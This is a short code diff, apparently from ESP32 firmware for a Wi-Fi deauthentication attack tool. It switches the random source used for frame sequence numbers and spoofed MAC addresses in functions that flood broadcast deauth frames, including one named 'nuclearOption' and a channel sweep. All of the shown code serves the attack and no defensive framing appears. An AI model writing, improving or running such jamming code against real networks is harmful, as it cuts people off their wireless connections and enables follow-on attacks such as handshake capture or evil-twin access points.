@@ -35,8 +35,8 @@ void buildDeauthFrame(DeauthFrame *frame, const uint8_t *dest,
     memcpy(frame->srcAddr, src, 6);
     memcpy(frame->bssidAddr, bssid, 6);
 
-    frame->seqCtrl[0] = random(0x00, 0xFF);
-    frame->seqCtrl[1] = random(0x00, 0xFF);
+    frame->seqCtrl[0] = (esp_random() % 255);
+    frame->seqCtrl[1] = (esp_random() % 255);
 
     frame->reasonCode[0] = 0x01;  // Unspecified reason
     frame->reasonCode[1] = 0x00;
@@ -92,7 +92,7 @@ DeauthResult nuclearOption(uint32_t durationMs) {
         uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
         uint8_t randomMac[6];
         for (int i = 0; i < 6; i++) {
-            randomMac[i] = random(0x00, 0xFF);
+            randomMac[i] = (esp_random() % 255);
         }
 
         // Deauth from multiple spoofed APs
@@ -149,7 +149,7 @@ DeauthResult broadcastDeauth(const DeauthConfig &config) {
         uint8_t spoofedMac[6];
         if (config.randomizeMac) {
             for (int i = 0; i < 6; i++) {
-                spoofedMac[i] = random(0x00, 0xFF);
+                spoofedMac[i] = (esp_random() % 255);
             }
         } else {
             memcpy(spoofedMac, config.targetBssid, 6);
@@ -208,7 +208,7 @@ DeauthResult channelSweep(const DeauthConfig &config) {
         uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
         uint8_t randomMac[6];
         for (int i = 0; i < 6; i++) {
-            randomMac[i] = random(0x00, 0xFF);
+            randomMac[i] = (esp_random() % 255);
         }
 
         sendDeauthPacket(broadcast, randomMac, broadcast);
